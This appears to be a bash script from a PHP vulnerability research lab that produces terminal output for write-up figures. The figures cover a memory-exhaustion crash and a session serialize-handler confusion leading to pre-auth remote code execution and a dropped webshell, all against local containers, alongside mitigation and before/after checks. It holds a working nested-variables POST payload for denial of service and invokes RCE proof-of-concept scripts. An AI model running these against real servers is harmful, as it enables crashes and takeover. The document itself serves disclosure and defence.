#!/usr/bin/env bash
# Produce the exact terminal output for each write-up figure, one at a time.
# Usage:  ./docs/screenshots.sh <1-9>      (run from the repo root; lab must be up)
# Screenshot your terminal after each. Figures 1-8 are instant; 9 compiles (~15-20 min).
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
FPM=http://127.0.0.1:18080
APACHE=http://127.0.0.1:18081

nested_body() { python3 -c "open('/tmp/nested.bin','w').write('&'.join(['a[]'+'[b]'*63+'=c']*1000))"; }

case "${1:-}" in
1)  echo "# the lab stack (vulnerable PHP 8.3.35, two SAPIs)"
    podman ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}' | grep -E 'oomlab|NAMES' ;;

2)  echo "# detection: is the target exposed? (read-only)"
    curl -s "$FPM/info.php" ;;

3)  echo "# full chain: detection -> injection -> __destruct -> RCE"
    "$ROOT/poc/run_demo.sh" fpm ;;

4)  echo "# apply mitigations to the Apache container, then re-check"
    podman cp "$ROOT/patch/guard.php" oomlab-apache:/usr/local/etc/guard.php
    { echo 'auto_prepend_file = /usr/local/etc/guard.php'; cat "$ROOT/patch/mitigations.ini"; } \
      | podman exec -i oomlab-apache tee /usr/local/etc/php/conf.d/zzz-hard.ini >/dev/null
    podman restart oomlab-apache >/dev/null; sleep 2
    podman exec -u root oomlab-apache sh -c 'chmod 1733 /var/lib/php/sessions' 2>/dev/null
    curl -s "$APACHE/info.php" ;;

5)  echo "### BEFORE (vulnerable FPM) ###"
    python3 "$ROOT/poc/probe_conditions.py" --url "$FPM"
    echo; echo "### AFTER mitigations (hardened Apache) ###"
    python3 "$ROOT/poc/probe_conditions.py" --url "$APACHE" ;;

6)  echo "# the dropped webshell executing on its own (pre-auth RCE result)"
    python3 "$ROOT/poc/rce_handler_confusion.py" --sid shot6 >/dev/null
    curl -s "$FPM/data/hc_rce.php"; echo ;;

7)  echo "# serialize-handler confusion: pre-auth RCE over HTTP, no LFI, no planting"
    python3 "$ROOT/poc/rce_handler_confusion.py" --sid shot7 ;;

8)  echo "# faithful startup-OOM (nested-vars POST), pre-auth, zero app dependency"
    podman exec -u root oomlab-fpm sh -c 'printf "memory_limit=16M\nmax_input_vars=100000\n" > /usr/local/etc/php/conf.d/zzz-oom.ini'
    podman restart oomlab-fpm >/dev/null; sleep 2
    podman exec -u root oomlab-fpm sh -c 'chmod 1733 /var/lib/php/sessions' 2>/dev/null
    podman restart oomlab-nginx >/dev/null; sleep 2
    nested_body
    echo "trigger body: $(wc -c < /tmp/nested.bin) bytes"
    curl -s -X POST --data-binary @/tmp/nested.bin -H 'Content-Type: application/x-www-form-urlencoded' "$FPM/info.php" | sed 's/<[^>]*>//g' | grep -i 'memory size'
    echo; echo "FPM worker crash log (vulnerable 8.3.35):"
    podman logs oomlab-fpm 2>&1 | grep 'exited with code' | tail -3 ;;

9)  echo "# EOL backport proof on PHP 8.1.34 (compiles patched php-cgi, ~15-20 min)"
    bash "$ROOT/backport/prove.sh" ;;

*)  echo "usage: $0 <1-9>"; exit 1 ;;
esac
